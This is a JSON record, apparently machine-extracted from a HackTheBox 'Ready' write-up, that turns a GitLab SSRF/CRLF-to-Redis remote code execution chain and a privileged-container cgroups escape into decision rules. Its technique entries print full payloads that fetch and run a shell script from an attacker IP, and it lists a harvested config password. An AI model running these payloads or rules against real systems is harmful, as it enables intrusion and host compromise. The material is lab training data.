@@ -1,0 +1,826 @@
+{
+  "writeup_id": "Htb_Ready",
+  "scenario_fingerprint": {
+    "scenario_name": "gitlab_ssrf_crlf_container_escape",
+    "primary_services": [
+      "http",
+      "ssh",
+      "redis"
+    ],
+    "port_signature": "22+5080",
+    "service_combination": "ssh+http_gitlab",
+    "os_family": "linux",
+    "environment_type": "containerized_application",
+    "entry_vector": "gitlab_cve_chain",
+    "privilege_path": "ssrf_to_rce_to_container_escape",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "gitlab_outdated_version",
+      "ssrf_bypass_ipv6_localhost",
+      "crlf_injection_redis",
+      "privileged_container"
+    ],
+    "environmental_clues": [
+      "gitlab_on_non_standard_port",
+      "version_disclosure_help_page",
+      "redis_localhost_only",
+      "container_filesystem_access"
+    ],
+    "similar_scenarios": [
+      "laboratory_htb_easy",
+      "gitlab_rce_containers"
+    ],
+    "unique_aspects": [
+      "cve_2018_19571_ssrf",
+      "cve_2018_19585_crlf",
+      "privileged_container_escape",
+      "cgroups_abuse"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "GitLab_CVE_Exploitation",
+        "success_reason": "Outdated GitLab version (11.4.7) with known SSRF and CRLF injection vulnerabilities",
+        "prerequisite_indicators": [
+          "gitlab_service_accessible",
+          "version_disclosure_available",
+          "user_registration_enabled",
+          "redis_service_running_locally"
+        ],
+        "recognition_patterns": [
+          "GitLab version in help page",
+          "Import project functionality available",
+          "IPv6 localhost bypass works",
+          "CRLF injection in URL parameters"
+        ],
+        "failure_modes": [
+          "gitlab_version_patched",
+          "import_functionality_disabled",
+          "redis_not_accessible",
+          "localhost_bypass_blocked"
+        ],
+        "environmental_factors": [
+          "unpatched_gitlab_installation",
+          "default_redis_configuration",
+          "insufficient_input_validation",
+          "missing_security_updates"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "SSRF_via_Import_Project",
+        "success_reason": "GitLab blocked 127.0.0.1 but not IPv6 localhost representation",
+        "prerequisite_indicators": [
+          "import_project_feature_enabled",
+          "redis_running_on_localhost",
+          "ipv6_localhost_bypass_unpatched"
+        ],
+        "recognition_patterns": [
+          "Import by URL functionality",
+          "Error message differences between blocked/allowed IPs",
+          "IPv6 address format acceptance"
+        ],
+        "failure_modes": [
+          "comprehensive_localhost_blocking",
+          "import_feature_restricted",
+          "redis_authentication_required"
+        ],
+        "environmental_factors": [
+          "incomplete_ssrf_protection",
+          "default_redis_binding",
+          "missing_ipv6_filtering"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "CRLF_Injection_to_Redis_Commands",
+        "success_reason": "URL parameter allowed newline injection enabling Redis command execution",
+        "prerequisite_indicators": [
+          "crlf_injection_vulnerability",
+          "redis_accessible_via_ssrf",
+          "gitlab_worker_queue_system"
+        ],
+        "recognition_patterns": [
+          "Newlines accepted in URL parameters",
+          "Redis protocol responses",
+          "GitlabShellWorker queue system"
+        ],
+        "failure_modes": [
+          "input_sanitization_enabled",
+          "redis_command_restrictions",
+          "worker_queue_disabled"
+        ],
+        "environmental_factors": [
+          "vulnerable_url_parsing",
+          "redis_command_injection_possible",
+          "background_job_processing"
+        ],
+        "success_probability": 0.88,
+        "typical_timeframe": "20-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "GitLab version 11.4.7 disclosed",
+        "discovery_method": "Help page version information",
+        "why_critical": "Known vulnerable version with public exploits available",
+        "how_to_recognize": [
+          "Version displayed in help section",
+          "Update warning messages",
+          "CVE databases match version"
+        ],
+        "follow_up_actions": [
+          "search_for_known_cves",
+          "test_import_functionality",
+          "check_redis_accessibility"
+        ]
+      },
+      {
+        "discovery": "Import Project SSRF vulnerability",
+        "discovery_method": "Testing import by URL with external server",
+        "why_critical": "Allows access to internal services like Redis",
+        "how_to_recognize": [
+          "External requests from target server",
+          "Different error messages for blocked IPs",
+          "IPv6 localhost bypass works"
+        ],
+        "follow_up_actions": [
+          "test_localhost_access",
+          "enumerate_internal_services",
+          "attempt_crlf_injection"
+        ]
+      },
+      {
+        "discovery": "Redis accessible via IPv6 localhost",
+        "discovery_method": "SSRF with [0:0:0:0:0:ffff:127.0.0.1]:6379",
+        "why_critical": "Enables command injection through Redis protocol",
+        "how_to_recognize": [
+          "Redis connection responses",
+          "Different behavior vs blocked addresses",
+          "Protocol-specific error messages"
+        ],
+        "follow_up_actions": [
+          "craft_redis_commands",
+          "test_command_execution",
+          "establish_reverse_shell"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web_user",
+        "escalation_method": "CVE_Chain_to_RCE",
+        "why_possible": "Combination of SSRF and CRLF injection allows Redis command execution",
+        "recognition_signs": [
+          "vulnerable_gitlab_version",
+          "import_functionality_available",
+          "redis_service_accessible",
+          "worker_queue_system_active"
+        ],
+        "exploitation_path": "SSRF → Redis Access → CRLF Injection → Command Execution → Shell"
+      },
+      {
+        "privilege_level": "git_user_shell",
+        "escalation_method": "Container_Privilege_Escalation",
+        "why_possible": "Container likely running with privileged flag or host filesystem access",
+        "recognition_signs": [
+          "container_environment_detected",
+          "unusual_filesystem_mounts",
+          "privileged_container_indicators",
+          "host_system_access_possible"
+        ],
+        "exploitation_path": "Container Shell → Privileged Container → Host System Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22 and 5080 open, HTTP service shows GitLab login",
+        "decision": "Check GitLab version and search for known vulnerabilities",
+        "reasoning": "GitLab has history of critical CVEs, version identification is key",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "credential_brute_force",
+            "when": "if no CVEs found"
+          },
+          {
+            "option": "directory_enumeration",
+            "when": "if version hidden"
+          }
+        ],
+        "success_indicators": [
+          "version_disclosed_in_help_page",
+          "outdated_version_detected",
+          "cve_matches_found"
+        ],
+        "next_decision": "exploit_gitlab_vulnerabilities"
+      },
+      {
+        "step": 2,
+        "situation": "GitLab 11.4.7 identified with known CVEs",
+        "decision": "Exploit SSRF + CRLF injection for RCE via Redis",
+        "reasoning": "CVE-2018-19571 and CVE-2018-19585 provide direct RCE path",
+        "confidence": 0.95,
+        "prerequisites": [
+          "valid_gitlab_account",
+          "project_creation_access"
+        ],
+        "success_indicators": [
+          "redis_commands_executed",
+          "reverse_shell_obtained"
+        ],
+        "failure_fallbacks": [
+          "manual_exploit_debugging",
+          "alternative_cve_research"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Shell obtained as git user in container environment",
+        "decision": "Search for credential files and container escape vectors",
+        "reasoning": "Container environments often have config files with credentials",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "kernel_exploit_research",
+            "when": "if no config files found"
+          },
+          {
+            "option": "network_enumeration",
+            "when": "if multi-container setup"
+          }
+        ],
+        "success_indicators": [
+          "dockerenv_file_present",
+          "backup_directory_found",
+          "credential_files_discovered"
+        ],
+        "next_decision": "escalate_within_container"
+      },
+      {
+        "step": 4,
+        "situation": "Found backup files with potential credentials",
+        "decision": "Extract credentials and check for privileged container",
+        "reasoning": "Backup files often contain root passwords, privileged containers allow host access",
+        "confidence": 0.8,
+        "prerequisites": [
+          "backup_files_readable",
+          "container_capabilities_checkable"
+        ],
+        "success_indicators": [
+          "root_password_found",
+          "privileged_flag_detected"
+        ],
+        "failure_fallbacks": [
+          "file_permission_enumeration",
+          "process_enumeration"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_gitlab_cve_succeeds": {
+        "action": "establish_persistent_shell",
+        "tools": [
+          "nc",
+          "curl",
+          "bash"
+        ],
+        "next_phase": "container_enumeration"
+      },
+      "if_container_detected": {
+        "action": "search_for_escape_methods",
+        "alternatives": [
+          "privileged_container_abuse",
+          "credential_extraction",
+          "host_filesystem_access"
+        ],
+        "decision_criteria": "based_on_container_capabilities"
+      },
+      "if_credentials_found": {
+        "action": "escalate_to_root",
+        "purpose": "gain_full_container_control",
+        "tools": [
+          "su",
+          "sudo"
+        ]
+      },
+      "if_privileged_container": {
+        "action": "attempt_host_escape",
+        "methods": [
+          "cgroup_abuse",
+          "host_filesystem_mount"
+        ],
+        "tools": [
+          "mount",
+          "chroot"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_gitlab_version_first",
+        "reasoning": "gitlab_has_frequent_critical_cves_with_public_exploits",
+        "applicability": "gitlab_instances_detected"
+      },
+      {
+        "rule": "prioritize_ssrf_plus_crlf_on_gitlab",
+        "reasoning": "high_success_rate_for_rce_via_redis_backend",
+        "applicability": "gitlab_versions_11_4_7_and_similar"
+      },
+      {
+        "rule": "search_opt_and_backup_directories_in_containers",
+        "reasoning": "containers_often_have_config_files_in_predictable_locations",
+        "applicability": "docker_container_environments"
+      },
+      {
+        "rule": "check_privileged_flag_immediately_in_containers",
+        "reasoning": "privileged_containers_provide_direct_host_escape_path",
+        "applicability": "confirmed_container_environment"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "GitLab SSRF + CRLF Injection RCE",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "gitlab"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5080,
+          8080
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "gitlab_instance_accessible",
+          "vulnerable_gitlab_version",
+          "user_registration_enabled",
+          "redis_backend_present"
+        ],
+        "success_indicators": [
+          "gitlab_version_11.4.7_detected",
+          "import_project_functionality_available",
+          "ssrf_bypass_successful",
+          "redis_command_injection_works"
+        ],
+        "incompatible_with": [
+          "gitlab_patched_version",
+          "user_registration_disabled",
+          "ssrf_protections_enabled",
+          "redis_not_accessible"
+        ],
+        "confidence_boosters": [
+          "help_page_shows_version",
+          "update_warning_present",
+          "import_by_url_available",
+          "ipv6_localhost_bypass_works"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Container Escape via Privileged Flag",
+        "mitre_id": "T1611",
+        "required_services": [
+          "docker"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "docker_container_environment",
+          "privileged_flag_enabled",
+          "cgroups_accessible",
+          "host_filesystem_mountable"
+        ],
+        "success_indicators": [
+          "proc_self_cgroup_accessible",
+          "docker_sock_present",
+          "host_devices_accessible",
+          "fdisk_shows_host_disks"
+        ],
+        "incompatible_with": [
+          "non_privileged_container",
+          "seccomp_restrictions",
+          "apparmor_enabled",
+          "user_namespaces_isolated"
+        ],
+        "confidence_boosters": [
+          "dockerenv_file_present",
+          "cgroup_memory_limit_visible",
+          "host_proc_accessible",
+          "dev_directory_populated"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "gitlab_instance": {
+        "port_indicators": [
+          80,
+          443,
+          5080,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "gitlab"
+        ],
+        "banner_indicators": [
+          "GitLab",
+          "Sign in · GitLab"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "docker_container": {
+        "port_indicators": [],
+        "service_indicators": [
+          "docker"
+        ],
+        "file_indicators": [
+          "/.dockerenv",
+          "/proc/self/cgroup"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "redis_backend": {
+        "port_indicators": [
+          6379
+        ],
+        "service_indicators": [
+          "redis"
+        ],
+        "banner_indicators": [
+          "Redis"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "gitlab_ssrf_crlf_rce",
+          "when": "gitlab_vulnerable_version_detected",
+          "reason": "direct_rce_no_auth_bypass_needed"
+        },
+        {
+          "attack": "container_escape_privileged",
+          "when": "docker_container_with_privileged_flag",
+          "reason": "immediate_host_access_high_success_rate"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "credential_harvesting",
+          "when": "gitlab_container_compromised",
+          "reason": "often_contains_database_and_service_credentials"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "GitLab SSRF + CRLF Injection RCE",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "burp_proxy",
+            "command_template": "Intercept project import request and modify URL with CRLF injection",
+            "actual_command": "git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test%0D%0A multi%0D%0A sadd resque:gitlab:queues system_hook_push%0D%0A lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open('|curl http://10.10.14.8/shell.sh|bash').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"%0D%0A exec%0D%0A/.git",
+            "output_pattern": "reverse shell connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "gitlab-sploit.py",
+            "command_template": "python3 gitlab-sploit.py -u {username} -p {password} -g {gitlab_url} -l {local_ip} -P {local_port}",
+            "actual_command": "python3 gitlab-sploit.py -u 0xdf -p 0xdf0xdf -g http://10.10.10.220 -l 10.10.14.8 -P 443",
+            "success_factors": [
+              "valid_gitlab_account",
+              "vulnerable_version"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "gitlab_version_11.4.7_or_vulnerable",
+          "user_account_on_gitlab",
+          "redis_accessible_on_localhost_6379"
+        ],
+        "success_indicators": [
+          "reverse_shell_connection_established",
+          "command_execution_as_git_user",
+          "access_to_container_filesystem"
+        ],
+        "common_failures": [
+          "payload_encoding_issues",
+          "network_connectivity_problems",
+          "redis_not_accessible"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting",
+          "container_escape",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Privileged Container Escape via cgroups",
+        "mitre_id": "T1611",
+        "category": "privilege_escalation",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "cgroups_manipulation",
+            "command_template": "d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`; mkdir -p $d/w; echo 1 >$d/w/notify_on_release; t=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`; echo $t/c >$d/release_agent; printf '#!/bin/sh\\n{payload}' >/c; chmod +x /c; sh -c \"echo 0 >$d/w/cgroup.procs\"",
+            "actual_command": "d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`; mkdir -p $d/w;echo 1 >$d/w/notify_on_release; t=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`; echo $t/c >$d/release_agent;printf '#!/bin/sh\\ncurl 10.10.14.8/shell.sh | bash' >/c; chmod +x /c;sh -c \"echo 0 >$d/w/cgroup.procs\"",
+            "output_pattern": "host_root_shell",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "privileged_container_access",
+          "root_access_in_container",
+          "cgroups_filesystem_accessible"
+        ],
+        "success_indicators": [
+          "command_execution_on_host",
+          "root_access_on_host_system",
+          "access_to_host_filesystem"
+        ],
+        "common_failures": [
+          "container_not_privileged",
+          "cgroups_not_accessible",
+          "payload_execution_failure"
+        ],
+        "follow_up_techniques": [
+          "host_persistence",
+          "lateral_movement",
+          "data_exfiltration"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "Configuration File Credential Harvesting",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "grep",
+            "command_template": "cat {config_file} | grep -v \"^#\" | grep .",
+            "actual_command": "cat gitlab.rb | grep -v \"^#\" | grep .",
+            "output_pattern": "gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\"",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "su",
+            "command_template": "su -",
+            "actual_command": "su -",
+            "success_factors": [
+              "password_reuse",
+              "weak_password_policy"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "filesystem_access",
+          "readable_configuration_files",
+          "credential_reuse_by_administrators"
+        ],
+        "success_indicators": [
+          "credentials_extracted_from_config",
+          "successful_privilege_escalation",
+          "root_access_obtained"
+        ],
+        "common_failures": [
+          "no_credential_reuse",
+          "encrypted_configuration_files",
+          "insufficient_file_permissions"
+        ],
+        "follow_up_techniques": [
+          "container_escape",
+          "persistence_establishment",
+          "further_enumeration"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gitlab-sploit.py",
+        "use_case": "automated_gitlab_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "gitlab_penetration_testing"
+        ],
+        "alternatives": [
+          "manual_burp_exploitation",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "verify_gitlab_version_first",
+          "test_with_valid_credentials",
+          "prepare_reverse_shell_payload"
+        ]
+      },
+      {
+        "tool": "burp_proxy",
+        "use_case": "crlf_injection_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "manual_curl_requests",
+          "custom_http_clients"
+        ],
+        "best_practices": [
+          "url_encode_payloads_properly",
+          "test_injection_points_systematically",
+          "validate_backend_service_responses"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "gitlab_ssrf_crlf_to_rce",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Register account on GitLab instance",
+            "purpose": "Obtain authenticated access",
+            "expected_output": "Valid user session"
+          },
+          {
+            "step": 2,
+            "command": "Navigate to New Project -> Import Project -> Repo by URL",
+            "purpose": "Access vulnerable import functionality",
+            "expected_output": "Import form displayed"
+          },
+          {
+            "step": 3,
+            "command": "Enter git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git and intercept with Burp",
+            "purpose": "Bypass localhost restrictions",
+            "expected_output": "Request intercepted in Burp"
+          },
+          {
+            "step": 4,
+            "command": "Inject Redis commands via CRLF in URL",
+            "purpose": "Execute commands through Redis",
+            "expected_output": "Reverse shell connection"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "container_to_host_escape",
+        "steps": [
+          {
+            "step": 1,
+            "command": "cat /opt/backup/gitlab.rb | grep -v \"^#\" | grep .",
+            "purpose": "Extract credentials from config",
+            "expected_output": "SMTP password revealed"
+          },
+          {
+            "step": 2,
+            "command": "su - (with extracted password)",
+            "purpose": "Escalate to root in container",
+            "expected_output": "Root shell in container"
+          },
+          {
+            "step": 3,
+            "command": "Execute cgroups escape sequence",
+            "purpose": "Break out to host system",
+            "expected_output": "Root shell on host"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "10-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Ready",
+      "difficulty": "Medium",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2020-12-12",
+      "author": "bertolis",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "cve_exploitation",
+        "container_escape"
+      ],
+      "key_vulnerabilities": [
+        "gitlab_cve",
+        "privileged_container",
+        "credential_exposure"
+      ],
+      "environment_type": "containerized_application",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "gitlab_exploitation",
+        "container_escape_techniques",
+        "cgroup_abuse"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "container_fundamentals",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application_exploitation",
+      "subcategories": [
+        "container_escape",
+        "privilege_escalation",
+        "cve_exploitation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "container_breakout"
+      ],
+      "defensive_lessons": [
+        "container_hardening",
+        "avoid_privileged_containers",
+        "patch_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Laboratory",
+        "Gitlab",
+        "Delivery"
+      ],
+      "similarity_reasons": [
+        "gitlab_exploitation",
+        "cve_based_attacks",
+        "containerized_environments"
+      ],
+      "unique_aspects": [
+        "privileged_container_escape",
+        "cgroup_manipulation",
+        "dual_escape_methods"
+      ],
+      "difficulty_factors": [
+        "container_escape_complexity",
+        "multiple_escalation_paths",
+        "cve_research_required"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T04:00:46.497088",
+    "original_file": "0xdf_writeups/Htb Ready.md",
+    "content_length": 16110,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
